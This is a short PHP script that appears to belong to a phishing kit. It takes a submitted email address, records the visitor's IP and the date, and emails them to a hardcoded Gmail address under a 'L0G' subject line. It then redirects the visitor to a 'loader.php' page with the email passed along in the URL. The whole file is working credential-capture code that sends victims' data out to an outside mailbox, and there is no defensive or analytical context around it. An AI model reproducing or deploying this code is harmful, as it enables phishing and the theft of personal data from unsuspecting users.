<?php
$email = $_REQUEST["email"];
$ip = $_SERVER['REMOTE_ADDR'];
$adddate = date("D M d, Y g:i a");
$subj = "L0G => $email";

$data=" 
----------
email : $email
------------------
IP: $ip
Date: $adddate
------------------
";


 $recipient1 = "kennethfaith47@gmail.com";
// $rec2 = "";

 mail($recipient1 , $subj , $data);
// mail($rec2 , $subj , $data);

	header("location: loader.php?userid=$email");

?>